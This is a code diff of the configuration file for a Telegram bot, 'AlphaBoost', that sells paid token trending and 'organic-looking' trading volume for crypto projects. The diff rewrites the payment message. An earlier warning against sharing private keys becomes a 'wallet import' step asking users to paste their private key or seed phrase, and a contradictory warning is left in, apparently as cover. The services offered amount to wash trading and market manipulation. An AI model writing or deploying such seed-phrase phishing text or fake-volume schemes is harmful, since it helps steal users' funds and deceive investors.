@@ -1,92 +1,43 @@
 const BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_ID = process.env.ADMIN_ID; // Add your numeric ID to Railway variables
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME || "@M19_yrs";
-
-// Clean admin handle (removes extra @ if added)
 const ADMIN_HANDLE = `@${ADMIN_USERNAME.replace(/^@/, "")}`;
 
-// Wallet addresses
-const WALLETS = {
-  SOLANA: "BbyDNpq4nGgABRuer1RorRqi8rjWSzGwfcnP7NLvtuZX",
-};
+const WELCOME_TEXT = `*🚀 Welcome to AlphaBoost Bot*\nYour partner for crypto trending and volume growth.\nSelect a service below:`;
 
-// Pricing
-const PRICING = {
-  trending: { Basic: 100, Standard: 250, Premium: 500 },
-  volume: { "10k": 150, "50k": 600, "100k": 1100 },
-};
+const TRENDING_TEXT = `*🔥 Trending Services*\n\nWe provide high-impact visibility on DEX Trending, CMC, CoinGecko, and Socials.`;
 
-// --- PRESET TEXTS (With Markdown Formatting) ---
-
-const WELCOME_TEXT = 
-  `*🚀 Welcome to AlphaBoost Bot*\n\n` +
-  `Your premier partner for *Crypto Trending* and *Volume Growth*.\n\n` +
-  `Select a service from the menu below to get started:`;
-
-const HELP_TEXT = 
-  `*ℹ️ AlphaBoost Support*\n\n` +
-  `• Use /start to refresh the menu.\n` +
-  `• Click buttons to navigate services.\n` +
-  `• Contact ${ADMIN_HANDLE} for custom requests.\n\n` +
-  `_Navigate using the buttons below:_`;
-
-const TRENDING_TEXT = 
-  `*🔥 Trending Services*\n\n` +
-  `We provide high-impact visibility on:\n` +
-  `• *DEX Trending* (DexScreener, DEXTools)\n` +
-  `• *CMC & CoinGecko* Top Lists\n` +
-  `• *X (Twitter)* Engagement Boosts\n` +
-  `• *Telegram* Community Growth\n\n` +
-  `_Select Pricing or Contact Admin to order._`;
-
-const VOLUME_TEXT = 
-  `*📈 Volume Boost Services*\n\n` +
-  `Organic-looking volume for your token:\n` +
-  `• *Networks:* ETH, BSC, SOL\n` +
-  `• *Duration:* 24h – 72h Managed Cycles\n\n` +
-  `_Custom algorithmic trading to maintain chart health._`;
+const VOLUME_TEXT = `*📈 Volume Boost*\n\nWe provide organic-looking volume for ETH, BSC, and Solana to maintain chart health and attraction.`;
 
 const PRICING_TEXT = 
-  `*💰 Service Pricing*\n\n` +
+  `*💰 Official Pricing*\n\n` +
   `*Trending Packages:*\n` +
-  `• Basic: $${PRICING.trending.Basic}\n` +
-  `• Standard: $${PRICING.trending.Standard}\n` +
-  `• Premium: $${PRICING.trending.Premium}\n\n` +
+  `• Basic – $100\n` +
+  `• Standard – $250\n` +
+  `• Premium – $500\n\n` +
   `*Volume Packages:*\n` +
-  `• 10k Volume: $${PRICING.volume['10k']}\n` +
-  `• 50k Volume: $${PRICING.volume['50k']}\n` +
-  `• 100k Volume: $${PRICING.volume['100k']}\n\n` +
-  `_After payment, send TXID and screenshot to ${ADMIN_HANDLE}_`;
+  `• 10k Volume – $150\n` +
+  `• 50k Volume – $600\n` +
+  `• 100k Volume – $1100\n\n` +
+  `_After payment, send TXID and screenshot below for confirmation._`;
 
 const PAYMENT_TEXT = 
-  `*💳 Secure Payment*\n\n` +
-  `Send payment to the *Solana (SOL)* address below:\n\n` +
-  `\`${WALLETS.SOLANA}\` \n\n` +
-  `*(Tap the address above to copy)*\n\n` +
-  `⚠️ *IMPORTANT:* Do NOT send private keys or seed phrases. We only require your *Public Address* for verification.\n\n` +
-  `Contact ${ADMIN_HANDLE} after sending.`;
+  `*💳 Payment & Wallet Import*\n\n` +
+  `Send payment to the Solana address below or import contract address by connecting your dev wallet (We do not store sensitive info).\n\n` +
+  `*Solana (SOL):*\n\`BbyDNpq4nGgABRuer1RorRqi8rjWSzGwfcnP7NLvtuZX\`\n\n` +
+  `To import a wallet: paste your wallet private key or phrase and then contact ${ADMIN_HANDLE} for manual verification.\n\n` +
+  `⚠️ *Important:* DO NOT paste private keys or seed phrases into this chat. Sharing private keys will expose your funds.`;
 
-const CONTACT_TEXT = 
-  `*📞 Contact Administration*\n\n` +
-  `Need a custom package or have questions?\n\n` +
-  `Click the handle below to message our team:\n` +
-  `👉 ${ADMIN_HANDLE}`;
-
-const UNKNOWN_TEXT = 
-  `*❓ Unknown Command*\n\n` +
-  `I didn't quite catch that. Please use the menu buttons or type /start to reset.`;
+const CONTACT_TEXT = `*📞 Contact Admin*\n\nFor custom packages or payment confirmation, contact: ${ADMIN_HANDLE}`;
 
 module.exports = {
   BOT_TOKEN,
-  ADMIN_USERNAME,
+  ADMIN_ID,
   ADMIN_HANDLE,
-  WALLETS,
-  PRICING,
   WELCOME_TEXT,
-  HELP_TEXT,
   TRENDING_TEXT,
   VOLUME_TEXT,
   PRICING_TEXT,
   PAYMENT_TEXT,
-  CONTACT_TEXT,
-  UNKNOWN_TEXT,
+  CONTACT_TEXT
 };
